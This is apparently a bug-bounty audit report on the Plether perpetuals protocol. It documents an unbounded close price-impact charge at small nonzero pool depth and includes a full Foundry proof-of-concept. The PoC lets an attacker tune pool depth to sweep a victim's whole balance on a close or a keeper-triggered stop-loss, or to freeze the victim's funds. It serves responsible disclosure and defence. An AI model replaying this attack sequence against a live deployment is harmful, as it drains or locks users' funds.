# \#97903 [SC-High] Close VPI is unbounded at small nonzero net pool depth: a healthy close or keeper-triggered stop-loss loses the whole account balance in degraded mode

**Submitted on Nov 3rd 2026 at 20:09:54 UTC by @Nyko for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97903
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

The close-time price impact (VPI) is `k * (S1^2 - S0^2) / (2D)`, where D is the pool's net economic depth. `CloseAccountingLib` exempts only `D == 0`; for a small positive D the charge has no upper bound. On a full close the charge is collected from the account's free settlement, released pledge and committed order margin until nothing is left. In degraded mode, an attacker who holds the winning side can size its own paid closes to leave D at a few dozen USDG; any healthy minority position that then closes, or whose armed stop-loss is triggered by any keeper, is charged many times its notional and loses its entire balance, including idle free settlement that degraded mode does not allow it to withdraw. With finite charge limits the position has no exit at all until the owner recapitalizes. The same window opens in the claim regime after any small inflow, including the owner's documented partial recapitalization.

## Vulnerability Details

1. VPI cost function (`CfdMath.sol:138`), unbounded as D goes to 0:

```solidity
uint256 costWad = (vpiFactorWad * sqSkewOverDepthWad) / WAD / 2;
```

2. Only exact zero depth is exempted (`CloseAccountingLib.sol:105-110`); charges are not clamped (the clamp at `:116-118` bounds rebates only):

```solidity
// With no economic depth, keep protective exits live without creating a fresh charge or rebate.
// The lifetime clamp below still recovers any previously received negative VPI.
if (inputs.poolDepthAssets != 0) {
    state.vpiDeltaAssets = CfdMath.calculateVPI(
        inputs.preSkewAssets, inputs.postSkewAssets, inputs.poolDepthAssets, inputs.vpiFactor
    );
}
```

3. On a full close the charge is collected from every bucket of the account, the remainder is waived (`CfdEnginePlanLib.sol:1112-1133`), so the account keeps nothing:

```solidity
collectibleFreeSettlementAssets += delta.liquidationReserveReleaseAssets;
...
delta.actionChargeWaivedAssets = delta.actionChargeToCollectAssets - delta.actionChargeCollectedAssets;
```

4. In degraded mode an account with a live position cannot withdraw its free settlement (`CfdEngineSettlementSidecar.sol:274-276`), so idle funds stay exposed to the close charge.

5. D is net pool assets after claims. A winner's payout is paid while it fits in cash (`CfdEngine.sol:849`, `_canPayFreshPoolPayout`), so the attacker's own partial closes, sized by lots, leave D at any value down to one lot's payout (71.86 USDG in the PoC). In the claim regime D is exactly 0 (exempt), and any small cash inflow reopens 0 < D: measured with the owner's partial recapitalization (D = 300), a keeper liquidation of an underwater account (D = 357.75) and the attacker's own losing close (D = 348.92). Each was followed by a stop-loss close that lost the victim's whole balance.

This contradicts the stated intent:
- the code comment above (protective exits stay live),
- `ACCOUNTING_SPEC.md:667`: "Protective closes and liquidations remain available under their existing health and settlement rules",
- `SECURITY.md:1506`, terminal-deficit runbook step 1: "Let closes and liquidations continue."

Every document defines only exact zero depth (`SECURITY.md:1439-1440`, `ACCOUNTING_SPEC.md:666-669`, `WHITEPAPER.md:864-868`), and the team's `NetEconomicDepth.t.sol` tests zero and normal depth only. The zero-depth exemption was added in commit 6d6622f2 (PR #118, the audited commit); treating D = 0 and D = 1 USDG oppositely makes that fix incomplete.

Preconditions, stated plainly: degraded mode with the pool nearly drained by paid winners. At release parameters this needs a basket round trip whose two legs total more than about 1.0 price unit (PoC: 1.00 -> 0.50 -> 1.60, never reaching the cap; smallest measured at release scale: 1.00 -> 0.44375 -> 1.45). This is the documented terminal-deficit regime (SECURITY.md "Explicit terminal-deficit cascade"). Once in it, the attacker controls D and the timing, and keepers are untrusted.

## Impact Details

PoC (release risk parameters, production Router and ProtectionBook calls only). Victim: healthy minority LONG, 300 lots (48,000 USDG notional), 35,000 pledge, 50,000 idle; value before 84,988.31.

| Case | D | Charge assessed | Victim after |
|---|---|---|---|
| (a) victim's own full close | 71.86 | 1,260,082.97 | 0.00 |
| (b) control, same book, D = 0 | 0 | 19.20 (fee) | 66,969.11 |
| (c) control, owner recap 200k | 200,071.86 | 471.77 | 66,516.54 |
| (d) any keeper triggers the victim's stop-loss | 71.86 | 1,260,082.97 | 0.00 |
| (e) finite `maxActionChargeAssets` (1,000) | 71.86 | close impossible | locked |

- (a)/(d): the charge is 26 times the closed notional; the victim loses 66,988 more than its actual price loss would cost (control b).
- (e): at t0 + 25 h, `cancelPositionProtection`, a close commit, `withdraw` and `executeLiquidation` all revert (`ProtectionNotArmed`, `ProtectionActive`, `CfdEngine__DegradedMode`, `PositionIsSolvent`). The funds stay frozen until the owner recapitalizes.
- Mass effect at release scale (50M pool): one keeper triggered five armed minority stop-losses with the attacker re-tuning D between them; all five were swept (334,960.75 USDG) for 0.20 USDG of trigger bounty each.
- Where the money goes: it lowers the owner's recapitalization by exactly the victims' loss; if the owner does not recapitalize, it pays the attacker's outstanding claim (+334,864.75 to the attacker in the release-scale run).

Selected impacts: "Temporary freezing of funds for at least 24 hours" (case e, measured 25 h, owner-only cure) and "Griefing" (cases a, d and the mass sweep: total loss of user balances for 0.20 USDG per victim).

## Recommended fix

Evaluate the close VPI at `max(D, floor)` with a floor tied to the open liability (or treat D below the floor as zero depth, like the existing exemption), and cap a close's fresh VPI charge at a fixed multiple of the closed notional.

## References

- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L105-L118
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdMath.sol#L134-L139
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L1112-L1133
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L274-L276
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L849
- ACCOUNTING_SPEC.md:666-669; SECURITY.md:1439-1440, :1499-1511; WHITEPAPER.md:864-868; commit 6d6622f2 (PR #118)



## Proof of Concept

## Proof of Concept

One Foundry test file at commit a82d4fefb02768e5b3bddcc97dee371eee24fea8, built on the repository's `BasePerpTest`. No in-scope contract is modified; MockPyth supplies price updates. Every trade, trigger and liquidation goes through the production `OrderRouter` and `PositionProtectionBook` entry points.

Steps:

1. Save the file below as `packages/perps/test/perps/nyko-vpi-sweep/VpiSweepCompact.t.sol`.
2. Run from the repository root: `forge test --root packages/perps --match-contract VpiSweepCompactTest -vv` (`FOUNDRY_VIA_IR=false` compiles faster; results are identical under the default via-IR profile).
3. Expected: 5 passed.

What the tests do (path 1.00 -> 0.50 -> 1.60, release risk parameters):
- setup: the attacker opens a hedged pair that fills the open gate; the basket falls to 0.50 and the attacker's LONG closes with a paid profit (degraded mode latches); the basket rises to 1.60 and the attacker's SHORT closes in sized orders until net depth D is 71.86 USDG. The victim is a healthy minority LONG with 35,000 pledge and 50,000 idle balance.
- `test_a_OwnCloseSwept`: the victim's own full close: assessed 1,260,082.97, victim balance 84,988.31 -> 0.
- `test_b_ControlZeroDepth`: one more attacker lot makes D = 0: the same close costs 19.20 (fee only).
- `test_c_ControlRecapitalized`: after a 200,000 owner recapitalization: the same close costs 471.77.
- `test_d_KeeperStopLossSwept`: an unrelated keeper triggers the victim's armed stop-loss: same sweep as (a).
- `test_e_FiniteLimitNoExit`: with `maxActionChargeAssets = 1,000` the protection latches; at t0 + 25 h cancel, close, withdraw and liquidation all revert.

Printed output (legacy and via-IR identical):

```
(a) D: 71.859220  V before: 84988.308983  V after: 0.000000  assessed: 1260082.974697  collected: 66988.308983
(b) D: 0.000000   V before: 84988.308983  V after: 66969.108983  assessed: 19.200000
(c) D: 200071.859220  V after: 66516.535591  assessed: 471.773392
(d) D: 71.859220  V after: 0.000000  assessed: 1260082.974697  collected: 66988.108983
(e) D: 71.859220  V after: 84988.108983 (locked)
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
// Plether perps @ a82d4fe: close VPI k(S1^2-S0^2)/(2D) is unbounded for small D > 0; CloseAccountingLib.sol:107
// exempts only D == 0. Release risk params. Path 1.00 -> 0.50 -> 1.60, all via Router/ProtectionBook: an own hedged
// pair fills the gate, both legs are paid, D ends < 200 USDG. Victim: healthy minority LONG, 300 lots, 35k pledge, 50k
// idle. Mocks: MockPyth, USDG.
// Install: packages/perps/test/perps/nyko-vpi-sweep/
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes as T} from "@plether/perps/CfdTypes.sol";
import {OrderRouter as R} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types as O} from "@plether/perps/OrderV3Types.sol";
import {IPositionProtectionActions as PA} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {PositionProtectionTypes as P} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth as M} from "@plether/test-utils/MockPyth.sol";
import {Vm} from "forge-std/Vm.sol";

contract VpiSweepCompactTest is BasePerpTest {
  uint256 constant MAX = type(uint256).max;
  uint256 constant P2 = 1.6e8;
  uint256 constant VL = 300; // victim lots (48k notional at 1.60)
  address constant A1 = address(0xA1); // attacker: A1 LONG leg, A2 SHORT leg (sizes D)
  address constant A2 = address(0xA2);
  address constant V = address(0x71C7); // victim; K = any keeper
  address constant K = address(0x4EE9);
  T.Side constant L = T.Side.LONG;
  T.Side constant S = T.Side.SHORT;
  PA book;
  uint256 pubT;
  function _riskParams() internal pure override returns (T.RiskParams memory) {
    return T.RiskParams(0.01e18, 0.4e18, 10, 20, 300, 500, 1e6, 10, 5000, 0);
  }
  function setUp() public override {
    super.setUp();
    baseMockPyth.setSynchronizeLegacyUniquePrices(false);
    book = PA(router.positionProtectionBook());
    _fundTrader(V, 85_005e6);
    _fundTrader(A1, 4e11);
    _fundTrader(A2, 9e12);
    _mark(1e8);
  }
  function _pay(uint256 p) internal returns (bytes[] memory d) {
    vm.warp(vm.getBlockTimestamp() + 1);
    vm.roll(vm.getBlockNumber() + 1);
    uint256 t = vm.getBlockTimestamp();
    M.FeedUpdate[] memory u = new M.FeedUpdate[](2);
    for (uint256 i; i < 2; ++i) u[i] = M.FeedUpdate(bytes32(i + 1), M.MockPrice(int64(int256(p)), 0, -8, t, pubT));
    (pubT, d) = (t, new bytes[](1));
    d[0] = abi.encode(u);
  }
  function _mark(uint256 p) internal {
    bytes[] memory d = _pay(p);
    vm.prank(K);
    R(address(router)).updateMarkPrice(d);
  }
  function _req(bool cl, T.Side s, uint256 lots, uint256 m) internal view returns (O.OrderRequest memory r) {
    (r.clientOrderId, r.side, r.sizeDelta, r.marginDelta, r.isClose) =
      (keccak256(abi.encode(router.nextCommitId())), s, lots * T.SIZE_QUANTUM, m, cl);
    r.targetPrice = (s == L) != cl ? 1 : CAP_PRICE;
    O.ExecutionBounds memory b = r.bounds;
    (b.submitBy, b.executionWindowSeconds, b.allowedExecutionModes) = (uint64(vm.getBlockTimestamp() + 60), 60, 7);
    b.expectedConfigHash = router.lifecycleBook().currentExecutionConfigHash();
    (b.maxExecutionBountyAssets, b.maxExecutionNotionalAssets, b.maxGrossAccountDebitAssets) = (MAX, MAX, MAX);
    (b.maxActionChargeAssets, b.maxExplicitFeesAssets, b.maxPostPositionSize) = (MAX, MAX, MAX);
    b.maxPostLeverageBps = type(uint32).max;
  }
  function _exec(uint64 id, uint256 p) internal returns (O.ExecutionResult memory) {
    bytes[] memory d = _pay(p);
    vm.prank(K);
    return R(address(router)).executeOrder(id, d);
  }

  // a commits; K executes at p
  function _trade(address a, bool cl, T.Side s, uint256 lots, uint256 m, uint256 p) internal returns (bool) {
    (O.OrderRequest memory r, uint256 s0) = (_req(cl, s, lots, m), _size(a));
    vm.prank(a);
    try R(address(router)).commitOrder(r) returns (uint64 id) {
      return _exec(id, p).status == O.LifecycleStatus.Executed && _size(a) != s0;
    } catch {
      return false;
    }
  }
  function _size(address a) internal view returns (uint256 s) {
    (s,,,,,,) = engine.positions(a);
  }
  function _D() internal view returns (uint256) {
    (uint256 a, uint256 c) = (pool.totalAssets(), engine.totalTraderClaimBalanceAssets());
    return a > c ? a - c : 0;
  }
  function _val() internal view returns (uint256) {
    return clearinghouse.balanceAssets(V);
  }

  // V opens (stop-loss 1.55 if slCharge > 0); the pair fills the gate; both legs paid
  function _book(uint256 slCharge) internal returns (uint64 pid) {
    require(_trade(V, false, L, VL, 35_000e6, 1e8));
    if (slCharge != 0) {
      _mark(1e8);
      P.PositionProtectionParams memory pp;
      (pp.stopLossTriggerPrice, pp.closeLimits) = (1.55e8, P.CloseFinancialLimits(MAX, MAX, slCharge, MAX));
      vm.prank(V);
      pid = book.createPositionProtection(pp);
    }
    require(_trade(A2, false, S, VL, VL * 0.6e8, 1e8)); // 60 % margin
    uint256 nL;
    for (uint256 st = 2000; st >= 5;) {
      if (_trade(A1, false, L, st, st * 1e6 + 1e6, 1e8)) {
        nL += st;
        require(_trade(A2, false, S, st, st * 0.6e8, 1e8));
      } else {
        st /= 2;
      }
    }
    require(_trade(A1, true, L, nL, 0, 0.5e8)); // degraded mode latches
    _mark(P2);
    uint256 d0 = _D();
    uint256 a = (d0 - 30_000e6) / 60e6; // 60 USDG per lot
    require(_trade(A2, true, S, a, 0, P2));
    require(_trade(A2, true, S, (_D() - 50e6) / ((d0 - _D()) / a + 1), 0, P2));
    assertEq(engine.totalTraderClaimBalanceAssets(), 0);
  }
  function _report(string memory tag, uint256 v0, uint256 d0) internal returns (uint256 x, uint256 y) {
    Vm.Log[] memory l = vm.getRecordedLogs();
    for (uint256 i; i < l.length; ++i) {
      bytes32 sig = keccak256("ActionChargeSettled(address,uint256,uint256,uint256)");
      if (l[i].topics.length > 1 && l[i].topics[0] == sig && l[i].topics[1] == bytes32(uint256(uint160(V)))) {
        (x, y) = abi.decode(l[i].data, (uint256, uint256));
      }
    }
    emit log(tag);
    _l(" V notional", VL * P2);
    _l(" D", d0);
    _l(" V before", v0);
    _l(" V after", _val());
    _l(" assessed", x);
    _l(" collected", y);
  }
  function _l(string memory k, uint256 v) internal {
    emit log_named_decimal_uint(k, v, 6);
  }
  function _closeV(string memory tag) internal returns (uint256 x) {
    (uint256 v0, uint256 d0) = (_val(), _D());
    vm.recordLogs();
    require(_trade(V, true, L, VL, 0, P2));
    (x,) = _report(tag, v0, d0);
  }
  function test_a_OwnCloseSwept() public {
    _book(0);
    assertGt(_closeV("(a) own full close, D tuned"), VL * P2);
    assertLt(_val(), 1e6);
  }
  function test_b_ControlZeroDepth() public {
    _book(0);
    require(_trade(A2, true, S, 7, 0, P2)); // payout > D: a claim, D == 0
    assertEq(_D(), 0);
    assertLt(_closeV("(b) control, D == 0"), 50e6);
    assertGt(_val(), 60_000e6);
  }
  function test_c_ControlRecapitalized() public {
    _book(0);
    uint256 cap = 200_000e6;
    settlementToken.mint(address(this), cap);
    settlementToken.approve(address(engine), cap);
    engine.recapitalizePool(cap);
    assertLt(_closeV("(c) control, owner recap 200k"), 1000e6);
    assertGt(_val(), 60_000e6);
  }
  function _trigger(uint64 pid) internal returns (O.ExecutionResult memory) {
    bytes[] memory d = _pay(P2);
    vm.prank(K);
    return _exec(book.triggerPositionProtection(pid, d), P2);
  }
  function test_d_KeeperStopLossSwept() public {
    uint64 pid = _book(MAX);
    (uint256 v0, uint256 d0) = (_val(), _D());
    vm.recordLogs();
    assertEq(uint8(_trigger(pid).status), uint8(O.LifecycleStatus.Executed));
    (uint256 x,) = _report("(d) keeper fires V's stop-loss", v0, d0);
    assertGt(x, VL * P2);
    assertLt(_val(), 1e6);
  }
  function _fails(address to, bytes memory cd, string memory err) internal {
    vm.prank(V);
    (bool ok, bytes memory r) = to.call(cd);
    assertFalse(ok);
    assertEq(bytes4(r), bytes4(keccak256(bytes(err))));
  }
  function test_e_FiniteLimitNoExit() public {
    uint64 pid = _book(1000e6);
    assertEq(uint8(_trigger(pid).terminalReason), uint8(O.TerminalReason.ConstraintViolation));
    vm.warp(vm.getBlockTimestamp() + 25 hours);
    _mark(P2);
    (uint256 v0, uint256 d0) = (_val(), _D());
    vm.recordLogs();
    _fails(address(book), abi.encodeCall(PA.cancelPositionProtection, (pid)), "OrderRouter__ProtectionNotArmed()");
    O.OrderRequest memory r = _req(true, L, VL, 0);
    _fails(address(router), abi.encodeCall(R.commitOrder, (r)), "OrderRouter__ProtectionActive()");
    bytes memory w = abi.encodeWithSignature("withdraw(address,uint256)", V, 1e6);
    _fails(address(clearinghouse), w, "CfdEngine__DegradedMode()");
    bytes[] memory d = _pay(P2);
    _fails(address(router), abi.encodeCall(R.executeLiquidation, (V, d)), "CfdEngine__PositionIsSolvent()");
    _report("(e) finite limit, t0+25h, no exit", v0, d0);
    emit log_named_decimal_int(" lens VPI", engineLens.previewClose(V, VL * T.SIZE_QUANTUM, P2).vpiDeltaAssets, 6);
  }
}
